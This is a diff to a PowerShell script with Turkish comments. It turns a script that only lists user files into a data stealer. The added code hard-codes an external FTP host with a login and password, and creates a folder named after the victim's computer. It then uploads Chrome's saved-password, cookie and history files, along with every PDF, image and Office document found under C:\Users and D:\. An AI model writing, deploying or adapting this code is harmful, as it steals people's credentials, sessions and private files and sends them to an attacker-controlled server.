@@ -1,5 +1,60 @@
+# FTP sunucusu bilgileri
+$ftpServer = "ftp://ftpupload.net/htdocs"
+$ftpUser = "if0_37085342"
+$ftpPassword = "VoUET8ZqlB0Crb"
+$ftpPort = 21
+
+# Bilgisayar adını al
+$computerName = $env:COMPUTERNAME
+
+# FTP klasörü oluşturma URL'si
+$ftpFolder = "$ftpServer/$computerName"
+
+# FTP sunucusunda klasör oluşturma
+function Create-FtpDirectory {
+    param (
+        [string]$ftpUrl,
+        [string]$ftpUser,
+        [string]$ftpPassword
+    )
+
+    try {
+        $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
+        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
+        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
+        $ftpRequest.UseBinary = $true
+        $ftpRequest.GetResponse().Close()
+    } catch {
+        Write-Output "Klasör oluşturulamadı veya zaten var: $($_.Exception.Message)"
+    }
+}
+
+# Klasör oluşturma
+Create-FtpDirectory -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword
+
+# Chrome tarayıcısının şifre, çerez ve geçmiş dosyalarının yolları
+$chromePaths = @{
+    "History" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    "Login Data" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    "Cookies" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+}
+
+# Chrome'un kurulu olup olmadığını kontrol et
+$chromeInstalled = Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
+
+if ($chromeInstalled) {
+    foreach ($file in $chromePaths.Keys) {
+        $path = $chromePaths[$file]
+        if (Test-Path $path) {
+            Upload-FileToFtp -filePath $path -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword
+        }
+    }
+} else {
+    Write-Output "Chrome tarayıcısı kurulu değil."
+}
+
 # Kontrol edilecek dosya uzantıları
-$extensions = @("*.pdf", "*.jpg", "*.jpeg", "*.png", "*.txt", "*.docx", "*.xlsx", "*.pptx")
+$extensions = @("*.pdf", "*.jpg", "*.jpeg", "*.png", "*.gif", "*.txt", "*.docx", "*.xlsx", "*.pptx")
 
 # Aranacak dizinler
 $searchPaths = @("C:\Users")
@@ -11,8 +66,46 @@ if (Test-Path "D:\") {
 
 foreach ($searchPath in $searchPaths) {
     foreach ($ext in $extensions) {
-        # Dosyaları bul ve tam yolunu listele
-        Get-ChildItem -Path $searchPath -Recurse -Filter $ext -ErrorAction SilentlyContinue |
-        ForEach-Object { $_.FullName }
+        # Dosyaları bul ve FTP'ye yükle
+        Get-ChildItem -Path $searchPath -Recurse -Filter $ext -ErrorAction SilentlyContinue | ForEach-Object {
+            Upload-FileToFtp -filePath $_.FullName -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword
+        }
+    }
+}
+
+# FTP'ye dosya yükleme fonksiyonu
+function Upload-FileToFtp {
+    param (
+        [string]$filePath,
+        [string]$ftpUrl,
+        [string]$ftpUser,
+        [string]$ftpPassword
+    )
+
+    if (Test-Path $filePath) {
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+        $ftpFullUrl = "$ftpUrl/$fileName"
+        
+        try {
+            $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpFullUrl)
+            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+            $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
+            $ftpRequest.UseBinary = $true
+
+            $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+            $ftpRequest.ContentLength = $fileContent.Length
+
+            $requestStream = $ftpRequest.GetRequestStream()
+            $requestStream.Write($fileContent, 0, $fileContent.Length)
+            $requestStream.Close()
+
+            $response = $ftpRequest.GetResponse()
+            Write-Output "Başarıyla yüklendi: $filePath"
+            $response.Close()
+        } catch {
+            Write-Output "Hata: $($_.Exception.Message)"
+        }
+    } else {
+        Write-Output "Dosya bulunamadı: $filePath"
     }
 }
